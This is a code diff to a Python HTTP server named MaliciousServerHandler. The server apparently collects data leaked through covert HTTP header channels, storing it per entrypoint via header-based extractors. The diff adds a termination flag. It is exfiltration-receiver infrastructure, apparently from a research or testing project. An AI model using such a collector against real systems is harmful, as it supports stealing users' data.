@@ -11,6 +11,7 @@ from modules.headers_order import HeadersOrderExtractor
 configs = {}
 leaked_data = {}
 bit_buffers = {}
+is_terminated = {}
 
 EXTRACTORS = {
     "dedicatedheader": DedicatedHeaderExtractor(),
@@ -46,6 +47,7 @@ class MaliciousServerHandler(BaseHTTPRequestHandler):
             configs[entrypoint] = leak_type
             leaked_data[entrypoint] = ""
             bit_buffers[entrypoint] = ""
+            is_terminated[entrypoint] = False
 
             #Sending response
             self.send_response(200)
@@ -55,6 +57,8 @@ class MaliciousServerHandler(BaseHTTPRequestHandler):
         else:
             self.send_response(404)
             self.end_headers()
+        
+        
 
     #Get is used to retrieve the leaked data for a specific entrypoint, if available.
     def do_GET(self):
@@ -84,7 +88,7 @@ class MaliciousServerHandler(BaseHTTPRequestHandler):
         extractor = EXTRACTORS.get(leak_type)
         
         if extractor:
-            extractor.extract(self.headers, entrypoint, leaked_data, bit_buffers)
+            extractor.extract(self.headers, entrypoint, leaked_data, bit_buffers, is_terminated)
             
         self.send_response(200)
         self.end_headers()
